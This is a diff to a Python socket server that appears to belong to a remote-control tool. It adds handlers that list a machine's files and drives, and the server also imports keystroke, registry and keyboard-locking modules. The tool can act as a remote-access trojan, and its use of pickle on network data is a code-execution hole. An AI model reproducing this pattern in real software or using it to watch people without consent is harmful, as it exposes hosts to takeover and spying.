@@ -2,7 +2,7 @@ import os
 from pickle import loads, dumps
 import socket
 import threading
-import utils, process, keystroke, registry, mac, lock_keyboard
+import utils, process, keystroke, registry, mac, lock_keyboard, dirtree
 
 HOST = socket.gethostname()
 PORT = 10000
@@ -246,6 +246,25 @@ def connection_handler(connection, address):
             except:
                 ok = False
                 data = None
+            send(connection, ok, data)
+
+        elif header == 'dirtree-getfiles':
+            try:
+                root = params[0]
+                ok = True
+                data = dirtree.list_files(root)
+            except:
+                ok = False
+                data = {'folders': [], 'files': []}
+            send(connection, ok, data)
+            
+        elif header == 'dirtree-getdrives':
+            try:
+                ok = True
+                data = dirtree.list_drives()
+            except:
+                ok = False
+                data = []
             send(connection, ok, data)
 
         else:
